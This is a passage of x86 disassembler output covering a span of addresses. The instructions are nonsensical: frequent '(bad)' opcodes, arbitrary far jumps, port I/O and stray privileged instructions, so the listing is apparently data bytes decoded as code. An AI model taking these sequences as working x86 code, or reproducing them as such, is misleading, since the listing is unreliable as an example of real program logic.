  415509:	xor    bh,BYTE PTR [ecx+0x3cabf464]
  41550f:	lahf   
  415510:	cmc    
  415511:	sub    al,dl
  415513:	test   DWORD PTR [edx],esi
  415515:	jge    0x415524
  415517:	aas    
  415518:	push   ebx
  415519:	stos   BYTE PTR es:[edi],al
  41551a:	rcr    ebx,cl
  41551c:	jae    0x4154a8
  41551e:	or     al,0x61
  415520:	jne    0x415538
  415522:	dec    ebp
  415523:	(bad)  
  415524:	add    eax,0xccae39a9
  415529:	mov    ds:0x9dd2a29,al
  41552e:	cmp    ecx,DWORD PTR [esi]
  415530:	mov    esp,cs
  415532:	into   
  415533:	xlat   BYTE PTR ds:[ebx]
  415534:	out    dx,eax
  415535:	mov    al,0xff
  415537:	jns    0x415593
  415539:	sbb    al,0x19
  41553b:	popa   
  41553c:	xchg   ebp,eax
  41553d:	adc    ebp,DWORD PTR [ebx-0x40]
  415540:	push   DWORD PTR [ebx]
  415542:	(bad)  
  415543:	jmp    FWORD PTR [edx+esi*1-0x3f]
  415547:	xor    eax,0xfba6f75d
  41554c:	data16 and BYTE PTR [ebp+ebx*1+0x3a],ah
  415551:	int    0x68
  415553:	cdq    
  415554:	fisubr WORD PTR [esi-0xb]
  415557:	jl     0x415593
  415559:	cld    
  41555a:	shr    edi,1
  41555c:	xor    eax,0x8cec7062
  415561:	pushf  
  415562:	xchg   ebx,eax
  415563:	test   bh,dh
  415565:	dec    edx
  415566:	scas   eax,DWORD PTR es:[edi]
  415567:	dec    eax
  415568:	jmp    0xc9fe:0xe1fd98a2
  41556f:	jb     0x415556
  415571:	cdq    
  415572:	xchg   ebp,eax
  415573:	dec    ebp
  415574:	pop    ebp
  415575:	xor    ecx,esp
  415577:	sub    bl,BYTE PTR [eax+eiz*1]
  41557a:	jp     0x415503
  41557c:	(bad)  
  41557e:	rol    DWORD PTR [esp+ebx*8+0x4d],cl
  415582:	pusha  
  415583:	sbb    al,0x17
  415585:	das    
  415586:	jno    0x41553f
  415588:	cmp    eax,0xdd770e6
  41558d:	jg     0x415560
  41558f:	mov    bl,0xe2
  415591:	jle    0x41552d
  415593:	inc    eax
  415594:	in     al,dx
  415595:	and    edi,esi
  415597:	mov    ?,WORD PTR [esi+edx*8-0x26]
  41559b:	pop    edi
  41559c:	mov    gs,ebp
  41559e:	and    DWORD PTR [eax-0x18896cbe],esi
  4155a4:	cmp    ch,BYTE PTR [edx]
  4155a6:	jmp    0x97dd:0xab13a82
  4155ad:	xchg   esi,eax
  4155ae:	adc    al,0x5c
  4155b0:	lock loop 0x41562a
  4155b3:	pop    ebx
  4155b4:	mov    eax,es
  4155b6:	scas   eax,DWORD PTR es:[edi]
  4155b7:	fld    TBYTE PTR [ebx+ebp*1]
  4155ba:	xor    al,0x47
  4155bc:	mov    BYTE PTR [eax],bh
  4155be:	aaa    
  4155bf:	fiadd  WORD PTR [ecx]
  4155c1:	and    dl,BYTE PTR [esi+0x1e]
  4155c4:	repz in al,dx
  4155c6:	and    eax,DWORD PTR [ecx+edi*8+0x64765a5e]
  4155cd:	xor    eax,0x546d34c8
  4155d2:	sub    BYTE PTR [ebp+eax*1+0x50146f23],ch
  4155d9:	pop    edi
  4155da:	arpl   WORD PTR [edx],di
  4155dc:	out    dx,al
  4155dd:	push   ebx
  4155de:	clc    
  4155df:	fsub   DWORD PTR [ebx]
  4155e1:	jmp    0x4155e3
  4155e3:	shl    DWORD PTR [edx],0x19
  4155e6:	pop    ss
  4155e7:	mov    ds:0x2dfa9108,al
  4155ec:	cmc    
  4155ed:	aas    
  4155ee:	js     0x4155c9
  4155f0:	and    DWORD PTR [esi],esi
  4155f2:	enter  0x311a,0x9d
  4155f6:	pop    ds
  4155f7:	iret   
  4155f8:	cmp    edi,DWORD PTR [eax-0x31]
  4155fb:	mov    edi,DWORD PTR [esi+0x31]
  4155fe:	add    BYTE PTR [eax+0x9],0xc2
  415602:	cmp    al,0x2b
  415604:	iret   
  415605:	sub    al,0x1a
  415607:	enter  0x2040,0x75
  41560b:	ja     0x4155e9
  41560d:	pop    ds
  41560e:	out    0x6e,al
  415610:	xchg   esi,eax
  415611:	int3   
  415612:	(bad)  
  415613:	pop    edi
  415614:	mov    cl,0xb9
  415616:	test   DWORD PTR [eax-0x73],ecx
  415619:	mov    DWORD PTR [ebx+0x1c],esi
  41561c:	dec    ebp
  41561d:	pop    edx
  41561e:	nop
  41561f:	ins    DWORD PTR es:[edi],dx
  415620:	cmp    ch,ah
  415622:	loope  0x4155a9
  415624:	cmp    edi,DWORD PTR [edx]
  415626:	sti    
  415627:	adc    BYTE PTR [edi+0x62400cf8],al
  41562d:	int3   
  41562e:	xor    BYTE PTR [esi-0x23],ch
  415631:	jno    0x415688
  415633:	xchg   edi,eax
  415634:	xchg   esp,eax
  415635:	cli    
  415636:	and    eax,0xc9790ac5
  41563b:	sbb    al,0x2b
  41563d:	cli    
  41563e:	mov    al,fs:0x273866e0
  415644:	mov    bh,0xd8
  415646:	lods   eax,DWORD PTR ds:[esi]
  415647:	jns    0x415687
  415649:	test   BYTE PTR [edx],dl
  41564b:	dec    esp
  41564c:	add    eax,0x98188116
  415651:	ins    BYTE PTR es:[edi],dx
  415652:	lods   eax,DWORD PTR ds:[esi]
  415653:	pop    ss
  415654:	pop    eax
  415655:	mov    cl,0x7b
  415657:	or     eax,0xaa07d483
  41565c:	mov    bl,cl
  41565e:	cmp    DWORD PTR [ebx+0x4eebfe18],ecx
  415664:	daa    
  415665:	pop    edi
  415666:	xchg   esi,eax
  415667:	xlat   BYTE PTR ds:[ebx]
  415668:	sub    eax,0x53cd6f50
  41566d:	pusha  
  41566e:	dec    ebx
  41566f:	sbb    DWORD PTR [edx+edx*1+0x6a3ea072],0x623b874a
  41567a:	cmp    edi,DWORD PTR [esi+edi*2]
  41567d:	xchg   ecx,eax
  41567e:	scas   al,BYTE PTR es:[edi]
  41567f:	into   
  415680:	mov    eax,0xc71a923d
  415685:	or     ecx,DWORD PTR [edi+0x3b7d7a9e]
  41568b:	ja     0x415622
  41568d:	cdq    
  41568e:	stos   DWORD PTR es:[edi],eax
  41568f:	cs mov esi,0x4c0a810b
  415695:	or     BYTE PTR [edi+0x35],cl
  415698:	xchg   esi,eax
  415699:	cdq    
  41569a:	jle    0x415633
  41569c:	and    dh,ah
  41569e:	mov    al,0xe4
  4156a0:	out    0xcc,al
  4156a2:	fwait
  4156a3:	cmc    
  4156a4:	pop    ss
  4156a5:	es mov edx,0x1ba32979
  4156ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156ac:	adc    DWORD PTR [ebp-0xeaf2e0],edi
  4156b2:	jne    0x4156fc
  4156b4:	lods   eax,DWORD PTR ds:[esi]
  4156b6:	sti    
  4156b7:	mov    ch,0x44
  4156b9:	jnp    0x415721
  4156bb:	xor    BYTE PTR [ebp+0xac1e798],dl
  4156c1:	into   
  4156c2:	dec    ebx
  4156c3:	cmp    ch,ch
  4156c5:	dec    esi
  4156c6:	push   edx
  4156c7:	dec    edi
  4156c8:	and    eax,DWORD PTR [edx+0x6a]
  4156cb:	cld    
  4156cc:	into   
  4156cd:	inc    ecx
  4156ce:	fnstenv [edi]
  4156d0:	std    
  4156d1:	push   edx
  4156d2:	aam    0x35
  4156d4:	pushf  
  4156d5:	or     edx,DWORD PTR [ecx]
  4156d7:	pop    ebp
  4156d8:	pop    esi
  4156d9:	inc    esp
  4156da:	lods   eax,DWORD PTR ds:[esi]
  4156db:	cmp    dl,BYTE PTR [ecx]
  4156dd:	sub    DWORD PTR [ebx],ebp
  4156df:	mov    bl,0xb8
  4156e1:	scas   al,BYTE PTR es:[edi]
  4156e2:	(bad)  
  4156e3:	(bad)  
  4156e4:	adc    eax,0x5f4db11c
  4156e9:	es retf 0x262
  4156ed:	pop    eax
  4156ee:	dec    edx
  4156ef:	sbb    al,0xea
  4156f1:	aad    0x8e
  4156f3:	inc    ebx
  4156f4:	test   ah,dl
  4156f6:	(bad)  
  4156f7:	addr16 dec ecx
  4156f9:	call   0x20ed4035
  4156fe:	addr16 mov ecx,0x523b15e5
  415704:	je     0x4156ea
  415706:	out    0x40,al
  415708:	mov    cl,0x64
  41570a:	call   0x11a60695
  41570f:	fmul   DWORD PTR ds:0xf20a7ece
  415715:	jle    0x415728
  415717:	sbb    edx,DWORD PTR [edi]
  415719:	push   es
  41571a:	mov    esp,0x7224814f
  41571f:	inc    esp
  415720:	cwde   
  415721:	pop    esi
  415722:	inc    esi
  415723:	fcom   DWORD PTR [edx+0xe]
  415726:	pop    ds
  415727:	daa    
  415728:	add    DWORD PTR [esi+0x780a33c8],ecx
  41572e:	scas   eax,DWORD PTR es:[edi]
  41572f:	fisubr WORD PTR [ecx-0x56]
  415732:	jmp    0x7620:0x95ed62dd
  415739:	outs   dx,DWORD PTR ds:[esi]
  41573a:	ss mov edx,edx
  41573d:	jecxz  0x4156f0
  41573f:	xor    al,0x7c
  415741:	cmp    edi,DWORD PTR [ebx-0xfa0d1ab]
  415747:	call   0xc70854b8
  41574c:	out    0x29,al
  41574e:	mov    ds:0x645c72a9,eax
  415753:	outs   dx,DWORD PTR ds:[esi]
  415754:	aad    0x5
  415756:	imul   edi,ebx,0xffffffae
  415759:	cld    
  41575a:	mov    edx,0x95120e0f
  41575f:	sbb    al,0x6c
  415761:	in     al,0x5b
  415763:	mov    DWORD PTR [edi+0x1a],ebx
  415766:	out    dx,al
  415767:	cmp    DWORD PTR [edx],ebp
  415769:	mov    bl,0xba
  41576b:	fs jns 0x415704
  41576e:	pop    ss
  41576f:	mov    al,0xb9
  415771:	xchg   ebp,eax
  415772:	(bad)  
  415773:	mov    ebx,0x96a8bcac
  415778:	cmc    
  415779:	push   0x7de5e00b
  41577e:	rcl    cl,cl
  415780:	fldcw  WORD PTR [edx+0x48]
  415783:	pop    es
  415784:	jns    0x4157ee
  415786:	fs xchg esp,eax
  415788:	add    BYTE PTR [ebx-0x43],ch
  41578b:	xor    ecx,DWORD PTR [ebx-0x71]
  41578e:	lds    ebx,FWORD PTR [edx]
  415790:	cmp    al,0xc6
  415792:	xchg   ebx,eax
  415793:	and    BYTE PTR [edi+0x7cfbf0d],dh
  415799:	repz mov bl,0x8c
  41579c:	adc    eax,ecx
  41579e:	mov    al,BYTE PTR [eax-0x27]
  4157a1:	cmp    DWORD PTR [eax-0x19],esp
  4157a4:	imul   eax,ecx,0x9a9cbeaf
  4157aa:	xchg   BYTE PTR [ecx-0x6e],bh
  4157ad:	ficom  DWORD PTR [edi+0x26]
  4157b0:	add    al,0xcd
  4157b2:	enter  0x1dd5,0xf3
  4157b6:	std    
  4157b7:	pushf  
  4157b8:	iret   
  4157b9:	test   al,0xe
  4157bb:	xor    al,0xb2
  4157bd:	fld    TBYTE PTR [ebx]
  4157bf:	not    DWORD PTR [ecx-0x78d374fc]
  4157c5:	pushf  
  4157c6:	int3   
  4157c7:	xor    dl,BYTE PTR [eax]
  4157c9:	sbb    BYTE PTR [ebp-0x25c841c9],dh
  4157cf:	dec    cl
  4157d1:	test   al,0xe9
  4157d3:	or     eax,0xfcb1da4a
  4157d8:	push   ebx
  4157d9:	cs pop ss
  4157db:	pop    eax
  4157dc:	sar    DWORD PTR [edi],0x2a
  4157df:	mov    bl,0x31
  4157e1:	add    bl,ch
  4157e3:	sub    esi,ecx
  4157e5:	push   0x7c20b6e3
  4157ea:	mov    dl,0xfc
  4157ec:	loope  0x4157ed
  4157ee:	enter  0x991e,0x57
  4157f2:	and    eax,0xd246bef3
  4157f7:	or     ecx,esp
  4157f9:	inc    esi
  4157fa:	enter  0xc1d3,0x98
  4157fe:	fidivr DWORD PTR [eax]
  415801:	and    al,0xe0
  415803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415804:	push   es
  415805:	pop    es
  415806:	jnp    0x41582d
  415808:	outs   dx,BYTE PTR ds:[esi]
  415809:	cmp    ebx,DWORD PTR [ebp-0x6e27d432]
  41580f:	add    bl,BYTE PTR [ebx-0x4b]
  415812:	cmp    edx,DWORD PTR [edx]
  415814:	mov    ds:0x7953d1c1,al
  415819:	das    
  41581a:	ins    DWORD PTR es:[edi],dx
  41581b:	fs xchg esp,eax
  41581d:	push   ecx
  41581e:	leave  
  41581f:	out    0x65,eax
  415821:	dec    ebp
  415822:	rol    DWORD PTR [ebx],1
  415824:	jae    0x415865
  415826:	push   es
  415827:	sub    BYTE PTR [eax],cl
  415829:	sbb    esi,DWORD PTR [ebp-0x4c]
  41582c:	pop    edi
  41582d:	xor    ah,BYTE PTR [ebx]
  41582f:	cdq    
  415830:	and    BYTE PTR [esp],bl
  415833:	jno    0x415859
  415835:	icebp  
  415836:	or     eax,0xc23c202e
  41583b:	(bad)  
  41583d:	ss mov esi,0xc45fe617
  415843:	xor    DWORD PTR [esi+eax*2],ecx
  415846:	mov    eax,ds:0x161e79bd
  41584b:	es ret 0xcdbb
  41584f:	(bad)  
  415850:	or     al,0x9e
  415852:	mov    edx,0x5b28153c
  415857:	sti    
  415858:	bound  ebp,QWORD PTR [edi+ebx*8-0x18]
  41585c:	mov    ah,0xa6
  41585e:	ret    
  41585f:	les    eax,FWORD PTR [ecx+eax*1+0x10]
  415863:	inc    ebp
  415864:	jle    0x415820
  415866:	sub    al,0x49
  415868:	mov    cl,0x52
  41586a:	out    dx,eax
  41586b:	cmc    
  41586c:	loope  0x415867
  41586e:	push   cs
  41586f:	or     DWORD PTR [edx+eax*4],edx
  415872:	test   eax,0x657138d6
  415877:	test   DWORD PTR [esi-0x7e1b25d1],0x9a8288c9
  415881:	cmp    esi,DWORD PTR [ebx+0x40333777]
  415887:	inc    esi
  415888:	inc    ebp
  415889:	cdq    
  41588a:	test   eax,0x330269ec
  41588f:	loopne 0x415859
  415891:	in     eax,dx
  415892:	mov    eax,0x21b7bbe
  415897:	or     dh,BYTE PTR [edi+0x48]
  41589a:	or     ebp,ebp
  41589c:	(bad)
  4158a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158a1:	and    eax,0xe37ca1f1
  4158a6:	and    BYTE PTR [eax+0x7050b744],cl
  4158ac:	mov    ah,0x9b
  4158ae:	lock rcl DWORD PTR [edx],1
  4158b1:	mov    ch,0xee
  4158b3:	adc    eax,0x506d9fd6
  4158b8:	mov    cl,0xc2
  4158ba:	out    dx,al
  4158bb:	jmp    0x8cec:0x9457bbd1
  4158c2:	xchg   edx,eax
  4158c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158c4:	mov    al,0x26
  4158c6:	adc    ah,BYTE PTR fs:[esi+0x588e484d]
  4158cd:	call   0xbf9996af
  4158d2:	lea    edx,[esp+edi*2-0x54]
  4158d6:	adc    esi,esi
  4158d8:	js     0x4158d0
  4158da:	daa    
  4158db:	adc    ebx,0x7c
  4158de:	imul   eax,DWORD PTR [ebx-0x77],0x7
  4158e2:	pop    ss
  4158e3:	dec    ebp
  4158e4:	jmp    0xee5d:0xebd56b5b
  4158eb:	outs   dx,BYTE PTR ds:[esi]
  4158ec:	shl    ebp,0xf4
  4158ef:	pop    esp
  4158f0:	jno    0x41595f
  4158f2:	sbb    DWORD PTR gs:[ebp-0x60665aa4],eax
  4158f9:	and    DWORD PTR [eax-0x66],esi
  4158fc:	(bad)  
  4158fe:	mov    ecx,0x16f0243
  415903:	mov    ch,0x36
  415905:	loope  0x4158d4
  415907:	in     eax,dx
  415908:	push   ebx
  415909:	adc    al,0x29
  41590b:	ret    
  41590c:	jl     0x4158ee
  41590e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41590f:	cmp    eax,0xed0b35ce
  415914:	jg     0x4158aa
  415916:	ret    0x80aa
  415919:	cmp    BYTE PTR [ebp+ebx*4+0x60605962],ah
  415920:	in     al,0x5c
  415922:	adc    DWORD PTR [edx+0x4d5fc74b],ecx
  415928:	jne    0x41592a
  41592a:	cmp    esp,edx
  41592c:	dec    ebp
  41592d:	leave  
  41592e:	mov    bl,0xed
  415930:	mov    esp,0xad1c9791
  415935:	repnz shr DWORD PTR [ebx-0x20453ee2],cl
  41593c:	(bad)  
  41593d:	loope  0x41591a
  41593f:	push   ss
  415940:	adc    DWORD PTR [edi+0x63fb9413],esi
  415946:	cdq    
  415947:	idiv   DWORD PTR [ecx-0x29]
  41594a:	dec    edx
  41594b:	mov    bl,0x3
  41594d:	xchg   esp,eax
  41594e:	dec    esp
  41594f:	imul   ecx,DWORD PTR [esi],0x2d
  415952:	cmp    BYTE PTR [esi-0x22],cl
  415955:	loop   0x41595a
  415957:	fwait
  415958:	loope  0x4159bf
  41595a:	sahf   
  41595b:	xchg   BYTE PTR [esi],bl
  41595d:	and    ax,0x1d01
  415961:	(bad)  
  415962:	mov    bl,0x58
  415964:	or     al,0x4d
  415966:	add    al,0x2b
  415968:	js     0x4159e3
  41596a:	shl    BYTE PTR [eax-0x6f],1
  41596d:	out    dx,eax
  41596e:	push   ss
  41596f:	jl     0x415975
  415971:	jns    0x415908
  415973:	inc    edx
  415974:	inc    ecx
  415975:	sub    eax,0xef195a02
  41597a:	xchg   ebp,eax
  41597b:	out    dx,al
  41597c:	sub    BYTE PTR [ebx+ecx*8-0x58fefa15],bh
  415983:	sahf   
  415984:	ins    DWORD PTR es:[edi],dx
  415985:	mov    dh,0xc2
  415987:	mov    ecx,0xed378de0
  41598c:	xor    eax,0xb7660f6b
  415991:	fisubr WORD PTR [ecx-0x2b]
  415994:	adc    DWORD PTR [edi+0x36],esi
  415997:	jae    0x4159a0
  415999:	imul   edi,DWORD PTR [ebp-0x63],0x4b0fddc0
  4159a0:	mov    ebp,0x7fd1b233
  4159a5:	inc    ecx
  4159a6:	(bad)  
  4159a7:	lea    esi,[edi+ebx*8-0x73]
  4159ab:	jnp    0x4159fa
  4159ad:	sbb    eax,0xf9ae62b4
  4159b2:	lock stos BYTE PTR es:[edi],al
  4159b4:	mov    DWORD PTR [edi+0x2b],0x42646f22
  4159bb:	sub    al,0xaf
  4159bd:	adc    cl,al
  4159bf:	sub    DWORD PTR [eax+0x29],ebp
  4159c2:	call   0xd293851d
  4159c7:	popa   
  4159c8:	pop    esi
  4159c9:	mov    esi,0x3635edaa
  4159ce:	ins    DWORD PTR es:[edi],dx
  4159cf:	xchg   edx,eax
  4159d0:	in     al,dx
  4159d1:	sbb    DWORD PTR [edi],0xffffff8a
  4159d4:	push   0x22f5b677
  4159d9:	outs   dx,DWORD PTR ds:[esi]
  4159da:	pop    eax
  4159db:	adc    al,0x27
  4159dd:	or     al,ch
  4159df:	jbe    0x41597b
  4159e1:	inc    eax
  4159e2:	pusha  
  4159e3:	jae    0x415a45
  4159e5:	push   es
  4159e6:	add    cl,bh
  4159e8:	mov    WORD PTR [esi-0x7d],ds
  4159eb:	jecxz  0x415a69
  4159ed:	call   0x46ef5c71
  4159f2:	cmp    al,0x6e
  4159f4:	inc    esp
  4159f5:	nop
  4159f6:	push   ebx
  4159f7:	sbb    al,0xd5
  4159f9:	push   edx
  4159fa:	mul    BYTE PTR [edx-0x11]
  4159fd:	jne    0x415a6a
  4159ff:	jl     0x4159c5
  415a01:	aas    
  415a02:	test   al,0x71
  415a04:	push   0xffffffd0
  415a06:	(bad)  
  415a07:	rol    DWORD PTR [eax-0x25c1903],cl
  415a0d:	jmp    0xd8c3:0x59526643
  415a14:	dec    esi
  415a15:	push   ecx
  415a16:	jae    0x4159c0
  415a18:	stos   BYTE PTR es:[edi],al
  415a19:	rcr    BYTE PTR [ebx+0x4],0x5b
  415a1d:	repz sti 
  415a1f:	jo     0x415a48
  415a21:	scas   al,BYTE PTR es:[edi]
  415a22:	call   0x712e:0xdc818e80
  415a29:	sbb    al,0x61
  415a2b:	stos   BYTE PTR es:[edi],al
  415a2c:	dec    ebp
  415a2d:	test   BYTE PTR [ebx],0x4e
  415a30:	jno    0x415a48
  415a32:	mov    esi,0x46a17391
  415a37:	loope  0x4159d1
  415a39:	xor    al,0xdb
  415a3b:	xlat   BYTE PTR ds:[ebx]
  415a3c:	push   edi
  415a3d:	je     0x4159dd
  415a3f:	addr16 jge 0x415a3a
  415a42:	inc    esi
  415a43:	push   esi
  415a44:	xor    esp,DWORD PTR [edx-0x4cd12ac1]
  415a4a:	xchg   esp,eax
  415a4b:	cmp    ch,BYTE PTR [edx+0x26]
  415a4e:	into   
  415a4f:	leave  
  415a50:	fcomp  DWORD PTR [eax]
  415a52:	mov    dh,0x9
  415a54:	loopne 0x4159ed
  415a56:	loopne 0x415a9d
  415a58:	cmp    BYTE PTR [ebx-0x4ca3c7a4],bh
  415a5e:	or     DWORD PTR [ecx+0x6142716d],edi
  415a64:	gs in  eax,0xdf
  415a67:	and    al,0xd0
  415a69:	push   es
  415a6a:	dec    ecx
  415a6b:	mov    dl,0x2d
  415a6d:	test   DWORD PTR [eax-0x3a],esi
  415a70:	jg     0x415ae3
  415a72:	(bad)  
  415a73:	lock test ecx,edi
  415a76:	mov    edx,0x918b6460
  415a7b:	mov    edx,0x227b292b
  415a80:	or     esi,DWORD PTR [edx-0x4e4b2c58]
  415a86:	push   0x28d3dba3
  415a8b:	fidivr WORD PTR [ecx+0x7]
  415a8e:	int3   
  415a8f:	clc    
  415a90:	mov    ds:0x2aeea75a,al
  415a95:	add    esp,esp
  415a97:	loop   0x415acc
  415a99:	gs loopne 0x415b02
  415a9c:	adc    esp,DWORD PTR [ecx-0x33]
  415a9f:	jno    0x415aa4
  415aa1:	dec    eax
  415aa2:	gs dec ebp
  415aa4:	loop   0x415afe
  415aa6:	and    ah,BYTE PTR [ecx-0x3e]
  415aa9:	stc    
  415aaa:	fs sbb dl,al
  415aad:	(bad)  
  415aae:	in     eax,0x1
  415ab0:	cmc    
  415ab1:	and    ecx,DWORD PTR [eax+0x7d]
  415ab4:	(bad)  
  415ab5:	mov    WORD PTR ds:0xc53da725,ds
  415abb:	rcl    DWORD PTR [edx],1
  415abd:	pop    edx
  415abe:	pusha  
  415abf:	mov    al,ds:0xaba25e08
  415ac4:	fadd   st,st(0)
  415ac6:	cdq    
  415ac7:	inc    ecx
  415ac8:	loop   0x415ac2
  415aca:	and    eax,0x96e71d66
  415acf:	call   esi
  415ad1:	adc    ch,bh
  415ad3:	inc    esp
  415ad4:	dec    ebx
  415ad5:	addr16 mov eax,edx
  415ad8:	mov    ch,0xb7
  415ada:	or     al,0x42
  415adc:	sub    ah,BYTE PTR [edx+ecx*1-0x45]
  415ae0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ae1:	cmp    edx,DWORD PTR [ebx+0x33]
  415ae4:	mov    ds:0x2cf4091,al
  415ae9:	mov    ch,0xa6
  415aeb:	lods   al,BYTE PTR ds:[esi]
  415aec:	adc    BYTE PTR [edx-0x49],0xf7
  415af0:	aas    
  415af1:	push   ecx
  415af2:	gs cs jecxz 0x415b23
  415af6:	mov    al,ds:0x475d9098
  415afb:	sub    dl,bl
  415afd:	(bad)  [edi+ebx*8]
  415b00:	pop    es
  415b01:	mov    al,0xc6
  415b03:	jle    0x415abb
  415b05:	mov    al,0x5
  415b07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b08:	jb     0x415aff
  415b0a:	cmp    DWORD PTR ds:0xf394e2c9,ebx
  415b10:	das    
  415b11:	daa    
  415b12:	pop    edi
  415b13:	(bad)  
  415b14:	push   eax
  415b15:	pop    esi
  415b16:	adc    al,0x11
  415b18:	mov    WORD PTR [edi],cs
  415b1a:	pop    edi
  415b1b:	ret    
  415b1c:	retf   
  415b1d:	fbld   TBYTE PTR [ebx-0x28029a1e]
  415b23:	outs   dx,DWORD PTR ds:[esi]
  415b24:	setnp  dl
  415b27:	jg     0x415b33
  415b29:	dec    edi
  415b2a:	out    0xb9,eax
  415b2c:	scas   al,BYTE PTR es:[edi]
  415b2d:	(bad)  
  415b2e:	out    0x78,al
  415b30:	icebp  
  415b31:	cwde   
  415b32:	ret    
  415b33:	sub    BYTE PTR [ebp+0x5e442d61],cl
  415b39:	xchg   BYTE PTR [esi+edx*4],ch
  415b3c:	adc    dh,BYTE PTR [ecx]
  415b3e:	pop    ds
  415b3f:	callw  0xe268
  415b43:	fidivr DWORD PTR [ecx+0x375665de]
  415b49:	inc    edi
  415b4a:	push   0xffffffbe
  415b4c:	dec    esi
  415b4d:	repz arpl WORD PTR [ebx+esi*4-0x1cdde6d8],bp
  415b55:	add    DWORD PTR [ebp+0x4a120f19],esi
  415b5b:	ror    dh,cl
  415b5d:	stc    
  415b5e:	pop    esp
  415b5f:	(bad)  
  415b60:	shr    ebp,cl
  415b62:	xchg   ecx,eax
  415b63:	loope  0x415b3d
  415b65:	out    dx,eax
  415b66:	mov    ds:0xc004bbdc,al
  415b6b:	daa    
  415b6c:	hlt    
  415b6d:	inc    ecx
  415b6e:	xor    bh,BYTE PTR [ebp-0x658983ee]
  415b74:	or     eax,0x2a9bb085
  415b79:	leave  
  415b7a:	add    eax,0x5c275398
  415b7f:	shl    ebx,1
  415b81:	shl    DWORD PTR [edi-0x2a4aebc6],cl
  415b87:	add    BYTE PTR [edx],0xb6
  415b8a:	not    DWORD PTR [ebx+0x64394081]
  415b90:	stc    
  415b91:	and    eax,DWORD PTR [edi-0x7c1fe3dd]
  415b97:	mov    edx,0x1992e6a7
  415b9c:	jg     0x415b50
  415b9e:	sbb    eax,0xc593ae5a
  415ba3:	mul    BYTE PTR [ecx+0x2e6c6873]
  415ba9:	mov    ecx,0x85322094
  415bae:	xor    bl,0xb
  415bb1:	nop
  415bb2:	hlt    
  415bb3:	or     DWORD PTR [ecx+eiz*2+0x5d],0xffffffc3
  415bb8:	retf   
  415bb9:	fcom   DWORD PTR [edx-0x236873e4]
  415bbf:	stos   BYTE PTR es:[edi],al
  415bc0:	(bad)  
  415bc1:	sti    
  415bc2:	jl     0x415b6e
  415bc4:	shl    edi,0x65
  415bc7:	(bad)  
  415bc8:	pop    ds
  415bc9:	xor    DWORD PTR [eax],0xba625285
  415bcf:	cmp    BYTE PTR [ebp-0x3b],bh
  415bd2:	dec    ebp
  415bd3:	push   es
  415bd4:	and    ah,ah
  415bd6:	xchg   edx,eax
  415bd7:	aaa    
  415bd8:	cmp    BYTE PTR [ecx+esi*4+0x4],ah
  415bdc:	mov    ch,0x56
  415bde:	fcomp  DWORD PTR [eax]
  415be0:	lea    edi,[ebx+0x712e9406]
  415be6:	xor    edx,eax
  415be8:	test   BYTE PTR [edx+0x523b547e],ah
  415bee:	call   0xe759:0xa6fce4ec
  415bf5:	and    al,0x17
  415bf7:	xchg   ebp,eax
  415bf8:	adc    DWORD PTR [edx-0x6a],esp
  415bfb:	sub    bh,BYTE PTR [ecx]
  415bfd:	popa   
  415bfe:	dec    ebx
  415bff:	xchg   ebp,eax
  415c00:	in     eax,0xcd
  415c02:	hlt    
  415c03:	fsqrt  
  415c05:	mov    ch,0x61
  415c07:	and    dl,BYTE PTR [ebx+0x48beb9f6]
  415c0d:	jmp    0x415c72
  415c0f:	das    
  415c10:	adc    eax,0xd8f1cb3
  415c15:	sbb    esi,DWORD PTR [ebp+0xa9e5448]
  415c1b:	sub    ecx,DWORD PTR [eiz*2-0x6c80a1b]
  415c22:	fld    QWORD PTR [eax+0x395bca3]
  415c28:	inc    edi
  415c29:	cmp    eax,0x5241db53
  415c2e:	fwait
  415c2f:	adc    eax,0x969cbc91
  415c34:	lea    ebp,[edi+0x369a0922]
  415c3a:	adc    DWORD PTR [eax-0x4e],ebp
  415c3d:	pop    ds
  415c3e:	adc    ch,bl
  415c40:	mov    ebp,0xa58ebf8c
  415c45:	cwde   
  415c46:	(bad)  
  415c47:	mov    dh,0xa
  415c49:	add    eax,0x4ebaf79b
  415c4e:	dec    esi
  415c4f:	jno    0x415c53
  415c51:	mov    bh,0xe7
  415c53:	arpl   WORD PTR [esi+0x5dc4bbde],cx
  415c59:	pop    ebx
  415c5a:	sbb    BYTE PTR [edi+0x391fe4cf],ch
  415c60:	sbb    al,BYTE PTR [edi+0x3f]
  415c63:	sub    ebx,DWORD PTR [edi]
  415c65:	fwait
  415c66:	xchg   edx,eax
  415c67:	add    al,0x1a
  415c69:	xor    DWORD PTR [ebx+0x3c],esi
  415c6c:	mov    es,WORD PTR [esi-0x1f]
  415c6f:	push   esp
  415c70:	call   0x4eaba427
  415c75:	fcomp  QWORD PTR [ebx]
  415c77:	pop    eax
  415c78:	dec    edi
  415c79:	add    al,0xa1
  415c7b:	sub    dl,BYTE PTR [esi]
  415c7d:	loope  0x415cf1
  415c7f:	cwde   
  415c80:	adc    esi,esp
  415c82:	fimul  DWORD PTR [ecx+0x61c6dd4b]
  415c88:	aaa    
  415c89:	clc    
  415c8a:	int    0xbb
  415c8c:	push   ss
  415c8d:	std    
  415c8e:	xchg   edi,eax
  415c8f:	loop   0x415c44
  415c91:	adc    eax,0xaa3f3ede
  415c96:	cs sbb al,0xf6
  415c99:	pop    ebx
  415c9a:	sbb    edx,DWORD PTR [ecx+0x8]
  415c9d:	dec    ebp
  415c9e:	sbb    al,0x4a
  415ca0:	sar    DWORD PTR [edx+0x20],cl
  415ca3:	inc    esi
  415ca4:	dec    ebp
  415ca5:	jb     0x415cdf
  415ca7:	shl    DWORD PTR [ecx+0x6bafed8d],cl
  415cad:	mov    edx,0xcbffb399
  415cb2:	lock cmp BYTE PTR [edi-0x753627a1],ah
  415cb9:	imul   esp,DWORD PTR [ebp+0x16],0x2a
  415cbd:	mov    ebp,0x36a1e5c0
  415cc2:	jbe    0x415cce
  415cc4:	scas   al,BYTE PTR es:[edi]
  415cc5:	xor    al,0xfa
  415cc7:	mov    dl,0x95
  415cc9:	cmp    bl,dl
  415ccb:	mov    ds,WORD PTR [esi]
  415ccd:	ret    0xbad1
  415cd0:	lahf   
  415cd1:	inc    ecx
